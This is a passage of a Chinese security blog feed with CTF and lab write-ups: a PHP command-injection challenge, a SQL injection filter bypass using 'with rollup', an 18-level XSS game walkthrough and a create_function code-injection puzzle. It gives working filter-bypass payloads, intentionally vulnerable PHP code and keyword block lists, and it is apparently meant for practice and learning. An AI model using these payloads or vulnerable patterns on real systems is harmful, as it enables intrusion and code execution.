class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'nid'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">               <span class="keyword">if</span>(preg_match(<span class="string">"/[a-zA-Z]/"</span>,$_GET[<span class="string">'nid'</span>]))&#123;</span><br><span class="line">                  <span class="keyword">exit</span>(<span class="string">"Illegal operation!"</span>);</span><br><span class="line">               &#125;<span class="keyword">elseif</span>(strlen($_GET[nid])&gt;<span class="number">5</span>)&#123;</span><br><span class="line">                  <span class="keyword">exit</span>(<span class="string">"Illegal operation!"</span>);</span><br><span class="line">               &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">"&lt;p class=lead&gt;"</span>;</span><br><span class="line">                  system(<span class="string">"head ./news/"</span> . $_GET[<span class="string">'nid'</span>]);</span><br><span class="line">                  <span class="keyword">echo</span> <span class="string">"&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这个题目质量不高。。。</p><h4 id="美男子"><a href="#美男子" class="headerlink" title="美男子"></a>美男子</h4><p>这个题目一上来查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'global.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AttackFilter</span><span class="params">($StrKey,$StrValue,$ArrReq)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">if</span>(is_array($StrValue))</span><br><span class="line">    &#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$ArrReq.<span class="string">"/is"</span>,$StrtValue)==<span class="number">1</span>)&#123;   </span><br><span class="line">        <span class="keyword">print</span> <span class="string">"holy shit!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;      </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$filter = <span class="string">"union|select|from|where|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'key1'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'key2'</span>])) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&lt;&lt;&lt;DBAPP</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;img src='image/img.jpg' /&gt;</span></span><br><span class="line"><span class="string">&lt;!--index.phps--&gt;</span></span><br><span class="line"><span class="string">DBAPP;</span></span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$query = mysql_query(<span class="string">"SELECT * FROM tb_ctf WHERE key1 = '&#123;$_POST['key1']&#125;'"</span>); </span><br><span class="line"><span class="keyword">if</span>(mysql_num_rows($query) == <span class="number">1</span>) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    <span class="keyword">if</span>($key[<span class="string">'key2'</span>] == $_POST[<span class="string">'key2'</span>]) &#123;</span><br><span class="line">        <span class="keyword">print</span> $flag;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Error!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>左看右看发现这小过滤有点熟悉，这根本就是实验吧上面的原题好吧。。。考察的是with rollup的特性，以下图为例，根据pass这一列分组使用with rollup之后会产生一组属性为NULL的值，这也是为什么key2位NULL的原因</p><p><img src="https://s2.ax1x.com/2019/03/31/ArQGss.png" alt="ArQGss.png"></p><p>这里首先得绕过<code>mysql_num_rows($query) == 1</code>的判断，这很容易直接使用<code>or</code>就行使其恒成立，就会显示<code>Error</code>说明我们已经成功进入判断了</p><p>但是我们不知道数据库里面有多少数据，不知道哪一条是NULL，我们可以使用<code>limit offset</code>去一条条测试就好，根据我的payload来看这数据库本应该就一条数据。</p><p><img src="https://s2.ax1x.com/2019/03/31/ArQBz4.png" alt="ArQBz4.png"></p><p>就写到这里把，纯粹就是想逃离一下刷高数的恐惧2333333</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;复习数学复习到吐，结果又说推迟一个月再考试，实在对数学提不了兴趣就刷刷题，又来水一篇博客
    
    </summary>
    
      <category term="CTF" scheme="0verwatch.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="0verwatch.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>xss游戏通关笔记</title>
    <link href="0verwatch.top/xss-game.html"/>
    <id>0verwatch.top/xss-game.html</id>
    <published>2019-03-11T10:59:33.000Z</published>
    <updated>2019-03-11T11:02:53.998Z</updated>
    
    <content type="html"><![CDATA[<p>最近在练习xss，感觉这个游戏挺适合新手的，从代码层角度分析更加深刻认识xss的形成，<a id="more"></a>写了一下通关攻略，并附上了xss漏洞使用工具如何去fuzz。代码分享：链接: <a href="https://pan.baidu.com/s/12b_E1PtgUH0b93qupJ7IvQ" target="_blank" rel="noopener">https://pan.baidu.com/s/12b_E1PtgUH0b93qupJ7IvQ</a> 提取码: 2333</p><h3 id="level-1"><a href="#level-1" class="headerlink" title="level-1"></a>level-1</h3><p>这个题目发现url中有一个参数name可控，立刻用<code>&lt;script&gt;alert(1);&lt;/script&gt;</code>测试测试一下，弹窗成功，在xss中拥有同样弹窗效果的函数不止<code>alert</code>，还有<code>confirm</code>以及<code>prompt</code></p><p><img src="https://s2.ax1x.com/2019/03/05/kXHE8A.png" alt="kXHE8A.png"></p><p>从代码角度去看，可以发现就是直接用GET方式获取参数然后输出到浏览器上面，这是典型的没做过滤。怎么防御？可以加一个转义函数<code>htmlspecialchars</code>把一些html格式的东西编码就可以有效防止了。</p><p><img src="https://s2.ax1x.com/2019/03/05/kXHmKP.png" alt="kXHmKP.png"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p>同样的发现url中<code>keyword</code>参数可控，尝试探测一波，但是发现被转义了</p><p><img src="https://s2.ax1x.com/2019/03/05/kXXbE6.png" alt="kXXbE6.png"></p><p>猜测应该是使用了我上面所讲的函数，查看一下代码</p><p><img src="https://s2.ax1x.com/2019/03/05/kXOvmq.png" alt="kXOvmq.png"></p><p>我们发现只有一处是使用了这个转义函数的，还有一处没有进行过滤，在input标签里面，我们可以尝试去闭合input标签，构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(123);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>弹窗成功</p><p><img src="https://s2.ax1x.com/2019/03/05/kXX6H0.png" alt="kXX6H0.png"></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p>同样先测试一下看看哪里是输入点，哪里是输出点</p><p><img src="https://s2.ax1x.com/2019/03/05/kXjqLn.png" alt="kXjqLn.png"></p><p>然后再用最简单的语句<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>尝试一下，发现尖括号被转义了，而且刚才利用的点也被转义了</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvpz4.png" alt="kXvpz4.png"></p><p>观察一下源码是怎样过滤的，很明显两处都存在过滤函数</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvKQH.png" alt="kXvKQH.png"></p><p>但是这个函数有一点就是，默认配置是不过滤单引号的。只有设置了：         <code>ENT_QUOTES</code>，才可以转义单引号，所以这关的value值是刚好给了这样的一个机会去闭合。</p><p><img src="https://s2.ax1x.com/2019/03/05/kXvBmn.png" alt="kXvBmn.png"></p><p>所以可以构建payload，这次由于弹窗内容在尖括号内，可以使用事件去弹窗，这里介绍几个常用的事件函数，比如<code>onchange, onclick, oninput</code>等等，这里我使用<code>onchange</code>去实现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onchange=alert`123` &apos;</span><br></pre></td></tr></table></figure><p>弹窗成功</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxKhT.png" alt="kXxKhT.png"></p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p>同样的方法，先用<code>&lt;script&gt;alert(123);&lt;/script&gt;</code>尝试一下，发现标题处是经过了转义，但是在input标签内只是过滤了尖括号，可以怀疑此处是否出现使用黑名单的过滤。</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxa4K.png" alt="kXxa4K.png"></p><p>看一下代码，证实一下思路，发现确实如此，但是这里我们仍然可以使用事件去触发弹窗，这样就避免使用了尖括号了。</p><p><img src="https://s2.ax1x.com/2019/03/05/kXxh8S.png" alt="kXxh8S.png"></p><p>这里注意一下，跟上一题明显不同，这里需要使用双引号闭合，构造对应的payload，然后使用对应的注释符把后面的双引号给注释掉：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=alert `123` //</span><br></pre></td></tr></table></figure><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p>还是原来的测试手段，标题处的输出经过转义没啥利用，但是在input标签内你会发现测试的script标签被变成其他的东西，这就很有可能又是一个替换，再用上一关的payload去试试，你会发现on变成了o_n，相当于加了一个下划线，这就限制了我们使用事件以及标签了。</p><p><img src="https://s2.ax1x.com/2019/03/05/kjSz7R.png" alt="kjSz7R.png"></p><p>查看一下源码，果然源码对<code>&lt;script</code>以及<code>on</code>做了过滤。</p><p><img src="https://s2.ax1x.com/2019/03/05/kjpXPP.png" alt="kjpXPP.png"></p><p>这里可以使用<code>&lt;a&gt;</code>标签去实现弹窗的调用，这不存在on或者script等关键字，还使用了<code>javascript:alert(&#39;xss&#39;)</code>去调用了JavaScript的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;a href=&quot;javascript:alert(&apos;123&apos;)&quot;&gt;dian&lt;/a&gt; //</span><br></pre></td></tr></table></figure><p>后面点击就会产生弹窗了</p><p><img src="https://s2.ax1x.com/2019/03/05/kjiprD.png" alt="kjiprD.png"></p><p>实际上这题还可以大写绕过的。</p><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p>同样的，输入&lt;script和on都会被加上下划线，再尝试上面的payload会发现连href都被替换了，这样有可能是黑名单增加了。</p><p><img src="https://s2.ax1x.com/2019/03/05/kjiAPI.png" alt="kjiAPI.png"></p><p>观察一下代码可以发现，对于黑名单里面的数量确实增多了，但也不影响，我们可以使用大 小写去实现绕过，可以构造下面的 payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt; &lt;Script&gt;alert(&apos;123&apos;)&lt;/script&gt; //</span><br><span class="line">&quot;&gt;&lt;a Href=&quot;javascript:alert(123)&quot;&gt;dian&lt;/a&gt;//</span><br></pre></td></tr></table></figure><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p>输入的测试代码会发现里面的关键字被置换为空，这很明显就是直接将某些关键字变成空字符</p><p><img src="https://s2.ax1x.com/2019/03/05/kjA0oQ.png" alt="kjA0oQ.png"></p><p>看一下代码，可以发现确实是把关键字变成了空字符。</p><p><img src="https://s2.ax1x.com/2019/03/05/kjAsWn.png" alt="kjAsWn.png"></p><p>这里就用到一个SQL注入里面经常用到的技巧，双写绕过，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(123);&lt;/scrscriptipt&gt;</span><br></pre></td></tr></table></figure><p>同样的对on，src，data，href双写也可以实现同样的而效果</p><h3 id="level-8"><a href="#level-8" class="headerlink" title="level-8"></a>level-8</h3><p>分析一下代码，可以发现，这次的过滤比前面的好几关都要严格，不仅做了过滤，而且还对<code>input</code>标签里面的内容使用<code>htmlspecialchars</code>函数转义了。但是可以发现还有一处调用的字符串里面没有使用这样的函数去进行防护，可以利用这一点下功夫</p><p><img src="https://s2.ax1x.com/2019/03/07/kxcjsg.png" alt="kxcjsg.png"></p><p>那么该如何利用呢？这里只是过滤了关键字。但是可以使用HTML编码进行绕过，HTML编码的存在就是让他在代码中和显示中分开， 避免错误。推荐一个编码网站：<a href="https://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p>值得注意的是浏览器如果要把HTML编码解析并且渲染前提必须要这种编码一定要在标签内某个属性里面才行。如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;"</span> &gt;click&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure><p>但是里如果你把href也编码的话，这就无法正常渲染了</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a &amp;#104;&amp;#114;&amp;#101;&amp;#102;="&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;" &gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>所以这里可以参考上一关的payload，利用协议去绕过，利用a标签，修改里面的属性值即可，只是script这个关键字得转义一部分才行，如下</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javasc&amp;#x72;ipt:alert(123)</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/03/07/kx24UA.png" alt="kx24UA.png"></p><h3 id="level-9"><a href="#level-9" class="headerlink" title="level-9"></a>level-9</h3><p>从代码角度上看，只是增加了对于url的判断，其实对这一关没有太大影响</p><p><img src="https://s2.ax1x.com/2019/03/07/kxRVa9.png" alt="kxRVa9.png"></p><p>为什么这样说？在代码里面没啥影响的部分就是注释了，在某些挖掘漏洞的过程中使用注释往往可以起到意想不到的效果，这里可以在注释里面插入关键字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#x0070;t:alert(1)/*http://x.x.x.x*/</span><br></pre></td></tr></table></figure><p>当然如果单单为了弹窗，这样也行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascri&amp;#x0070;t:alert(&quot;http://&quot;)</span><br></pre></td></tr></table></figure><h3 id="level-10"><a href="#level-10" class="headerlink" title="level-10"></a>level-10</h3><p>随手测试了弹窗语句，发现被转义了，但是发现了3个隐藏参数，有点蹊跷</p><p><img src="https://s2.ax1x.com/2019/03/07/kxRIZ4.png" alt="kxRIZ4.png"></p><p>来分析一下源代码，发现keyword参数经过了<code>htmlspecialchars</code>函数的防护而且是以双引号拼接的，所以这里的利用价值很低，但发现另外一个t_sort参数，但是这个参数经过了过了尖括号的过滤，最后输出到其中一个隐藏的input标签内</p><p><img src="https://s2.ax1x.com/2019/03/07/kxWSdH.png" alt="kxWSdH.png"></p><p>虽然过滤了尖括号，但可以闭合双引号，使用<code>onclick</code>事件，然后把隐藏的标签用<code>text</code>方式回显出来即可，最后的payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">t_sort=<span class="string">" onclick="</span>alert(<span class="number">123</span>)<span class="string">" type="</span>text<span class="string">" "</span><span class="string">"</span></span><br></pre></td></tr></table></figure><h3 id="level-11"><a href="#level-11" class="headerlink" title="level-11"></a>level-11</h3><p>同样的情况明显的输出点被转义，但是存在几个隐藏的input标签，同样的观察一下代码，发现刚才利用的地方全都加上了防护，但是多出的一个标签内直接输出$str33，往回找这个变量来自哪里，发现来自http头，所以思路很明确，伪造http头部信息即可。</p><p><img src="https://s2.ax1x.com/2019/03/07/kxWwf1.png" alt="kxWwf1.png"></p><p>抓个包修改里面的<code>HTTP_REFERER</code>参数，payload也是原来的payload，因为这里的输出点的过滤跟上一关一样，也是过滤了尖括号，但无所谓用双引号闭合即可</p><p><img src="https://s2.ax1x.com/2019/03/08/kz6bOe.png" alt="kz6bOe.png"></p><h3 id="level-12"><a href="#level-12" class="headerlink" title="level-12"></a>level-12</h3><p>同样的，观察代码，发现这题跟上面的题目类似，利用的输出点在<code>$str33</code>这个变量上，只是这一次修改的头部信息不一样了，可以发现这次的头部信息是<code>HTTP_USER_AGENT</code></p><p><img src="https://s2.ax1x.com/2019/03/08/kzgbad.png" alt="kzgbad.png"></p><p>类似的payload，抓包发包即可</p><p><img src="https://s2.ax1x.com/2019/03/08/kzRPOO.png" alt="kzRPOO.png"></p><h3 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h3><p>分析一下源码，发现这一次不是从http头下功夫了，而是从cookie这一点入手了，可以看到代码里面首先对cookie进行一个初始值的设置，然后经过了两次的过滤，最后通过$str33这个变量输出。</p><p><img src="https://s2.ax1x.com/2019/03/08/kzfmsf.png" alt="kzfmsf.png"></p><p>因为过滤和输出点没有任何变化，所以利用方式还是上一关的方式，只是输入点变了而已，这次从cookie中的user变量进行输入，同样的payload：<code>&quot; onclick=&quot;alert(123)&quot;  type=&quot;text&quot; &quot;</code>，抓包改包即可</p><p><img src="https://s2.ax1x.com/2019/03/08/kzhC60.png" alt="kzhC60.png"></p><h3 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h3><p>这一关利用了图片exif的属性，经过上传之后可以利用里面的属性去触发xss漏洞，可惜没环境。直接跳到下一关吧</p><h3 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h3><p>观察源码，可以发现输出点用函数做了防护，而且比起前面几关多了很多不同点。</p><p><img src="https://s2.ax1x.com/2019/03/08/kz4u5Q.png" alt="kz4u5Q.png"></p><p>这里包含了angular js的脚本，并且使用了它的相关类:<code>ng-include</code>，百度可知这是一个有文件包含功能的类。</p><p><img src="https://s2.ax1x.com/2019/03/08/kz4jRs.png" alt="kz4jRs.png"></p><p>这样的话，思路就出来了，这个页面没利用点，但是利用另外一个存在漏洞的页面不就可以了吗？因为这里使用了函数防护，出现尖括号的东西很有可能会被转义，这里我们选择通过闭合产生xss漏洞的文件进行包含，选择level-2。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src=&apos;level2.php?keyword=&quot; onclick=&quot;alert(123)&quot; &quot;&apos;</span><br></pre></td></tr></table></figure><p>弹窗成功</p><p><img src="https://s2.ax1x.com/2019/03/08/kzomVK.png" alt="kzomVK.png"></p><h3 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h3><p>查看第16关的代码，发现输入的东西经过了大小写的转换并且通过四次的替换检查，分别对script，空格，/，进行了替换，但是有一点很重要，尖括号没有被替换，这给我们留下很大的利用空间。</p><p><img src="https://s2.ax1x.com/2019/03/08/kzoGrt.png" alt="kzoGrt.png"></p><p>另外script被替代，我们可以使用img标签，剩下我们就需要考虑如何把空格的影响给去掉，这时候就需要使用编码来进行绕过了，可以选择<code>%0d</code> <code>%0a</code> 进行绕过，构造出最后的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%0dsrc=1%0donerror=&quot;alert(123)&quot;&gt;</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p><img src="https://s2.ax1x.com/2019/03/08/kzoOiD.png" alt="kzoOiD.png"></p><h3 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h3><p>分析一下代码，发现输出点都进行了防护，对尖括号以及双引号进行了转义，但是不影响我们利用。</p><p><img src="https://s2.ax1x.com/2019/03/08/kzbrfU.png" alt="kzbrfU.png"></p><p><code>&lt;embed&gt;</code>标签定义嵌入的内容，比如插件，所以这里我们可以使用on事件去进行触发，但是首先得用b去闭合前面的等号，构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p>成功弹窗</p><p><img src="https://s2.ax1x.com/2019/03/08/kzq64f.png" alt="kzq64f.png"></p><p>查看输出验证一下思路</p><p><img src="https://s2.ax1x.com/2019/03/08/kzqBDA.png" alt="kzqBDA.png"></p><h3 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h3><p>跟上面那一个题目没有啥区别，一样的操作。。</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xss/level18.php?arg01=a&amp;arg02=b%20onmouseout=alert(1)</span><br></pre></td></tr></table></figure><p>直接弹窗</p><p><img src="https://s2.ax1x.com/2019/03/08/kzLZqA.png" alt="kzLZqA.png"></p><p>看看输出，跟上一关差不多</p><p><img src="https://s2.ax1x.com/2019/03/08/kzLGrj.png" alt="kzLGrj.png"></p><p>上面的游戏都是直接看源代码才发觉到哪里有漏洞，那么肯定问题来了，如果不给源码的情况下该怎样去测试呢？因为在现实渗透中我们需要一个个payload测试是很麻烦的</p><p>这里我提供一种比较大众一点的fuzz技巧。利用burpsuit自动化xss</p><p>首先我们得在burpsuit的Extender模块中下载对应的<code>XSS Validator</code>插件</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjkxU.png" alt="kzjkxU.png"></p><p>安装成功后可以发现菜单栏上会多一栏你插件的名字</p><p><img src="https://s2.ax1x.com/2019/03/08/kzORmj.png" alt="kzORmj.png"></p><p>这里我们还需要另外一个东西叫<code>PhantomJs</code>，这是下载地址：<a href="http://phantomjs.org/download.html，另外我们需要在xssValidator的github上下载一个小脚本" target="_blank" rel="noopener">http://phantomjs.org/download.html，另外我们需要在xssValidator的github上下载一个小脚本</a></p><p><img src="https://s2.ax1x.com/2019/03/08/kzXKgS.png" alt="kzXKgS.png"></p><p>然后把它放在跟<code>Phantomjs</code>同一级目录下即可，然后利用<code>Phantomjs</code>打开即可，此时开始监听</p><p><img src="https://s2.ax1x.com/2019/03/08/kzXjKg.png" alt="kzXjKg.png"></p><p>这里我以小游戏第一关为例，现在就可以使用bp抓包发送至爆破模块，然后选择插件模式，选择我们的插件</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjQG6.png" alt="kzjQG6.png"></p><p>然后去到该插件的页面复制它的特征码，加载进去字典中</p><p><img src="https://s2.ax1x.com/2019/03/08/kzjUII.png" alt="kzjUII.png"></p><p><img src="https://s2.ax1x.com/2019/03/08/kzjxSK.png" alt="kzjxSK.png"></p><p>点击attack，攻击成功的话会显示，同时监听也会出现报文的回显</p><p><img src="https://s2.ax1x.com/2019/03/08/kzvkFI.png" alt="kzvkFI.png"></p><p><img src="https://s2.ax1x.com/2019/03/08/kzvZSf.png" alt="kzvZSf.png"></p><p>这样去测试就比平常手工测试要便捷多了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近在练习xss，感觉这个游戏挺适合新手的，从代码层角度分析更加深刻认识xss的形成，
    
    </summary>
    
      <category term="xss" scheme="0verwatch.top/categories/xss/"/>
    
    
      <category term="xss" scheme="0verwatch.top/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>Code-Breaking-Puzzles学习</title>
    <link href="0verwatch.top/Code-Breaking-Puzzles-Learning.html"/>
    <id>0verwatch.top/Code-Breaking-Puzzles-Learning.html</id>
    <published>2019-02-27T12:48:46.000Z</published>
    <updated>2019-03-04T13:54:41.136Z</updated>
    
    <content type="html"><![CDATA[<p>这波刷题主要以学习为主，复现为主，知识点真的太棒了<a id="more"></a>23333</p><h3 id="easy-function"><a href="#easy-function" class="headerlink" title="easy - function"></a>easy - function</h3><p>这个题目的点很有意思是关于<code>create_function</code>这个函数的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先理解一下代码就是先得绕过一个正则，这个正则只有满足不是字母数字以及下划线才能绕过，才存在一个可控参数的函数调用，但是想不到怎么绕过的话，可以用<code>var_dump</code>函数尝试fuzz一下，可以得到<code>\</code>这个符号是可以绕过的</p><p><img src="https://s2.ax1x.com/2019/02/25/kIZ0GF.png" alt="kIZ0GF.png"></p><p>为什么可以绕过，p神在小密圈中有说过</p><p><img src="https://s2.ax1x.com/2019/02/25/kIZa5T.png" alt="kIZa5T.png"></p><p>也就是一个命名空间的问题，什么是命名空间？可以了解一下<a href="http://php.net/manual/zh/language.namespaces.definition.php" target="_blank" rel="noopener">http://php.net/manual/zh/language.namespaces.definition.php</a></p><p>但是接下来需要一个危险函数，由于PHP7的版本对于危险函数做了很多限制，但还是可以使用<code>create_function</code>这个函数，这个函数第一个参数是新构建函数的参数，第二个参数是代码内容，这个函数的利用点在哪？可以看一下这篇文章<a href="https://blog.51cto.com/lovexm/1743442，本质就是将第一个参数以及第二个参数分别合并而已，可以自己去看一下底层的代码，就是闭合下面这句函数" target="_blank" rel="noopener">https://blog.51cto.com/lovexm/1743442，本质就是将第一个参数以及第二个参数分别合并而已，可以自己去看一下底层的代码，就是闭合下面这句函数</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function __lambda_func ( function_args ) &#123; function_code &#125; \<span class="number">0</span></span><br></pre></td></tr></table></figure><p>所以对于两个参数就有两种闭合方式</p><ol><li>如果可控在第一个参数，需要闭合圆括号和大括号：<code>create_function(&#39;){}phpinfo();//&#39;, &#39;&#39;);</code></li><li>如果可控在第二个参数，需要闭合大括号：<code>create_function(&#39;&#39;, &#39;}phpinfo();//&#39;);</code></li></ol><p>突然觉得字符串拼接极其不安全。。。只要一闭合就可以创造点奇奇怪怪的东西，因为这里面是php7，危险函数不能用了，如果拿到的是webshell，也可以用php的scandir、glob等函数来遍历目录来找flag。</p><p>最后可以构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=&#125;var_dump(scandir(%27../%27));//</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=\create_function&amp;arg=&#125;var_dump(file_get_contents(&apos;../flag_h0w2execute_arb1trary_c0de&apos;));//</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/02/25/kImOgg.png" alt="kImOgg.png"></p><h3 id="easy-pcrewaf"><a href="#easy-pcrewaf" class="headerlink" title="easy-pcrewaf"></a>easy-pcrewaf</h3><p>这个题目是有关正则的一个绕过，详细的原理可以看看p神的这篇文章:<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html。" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html。</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 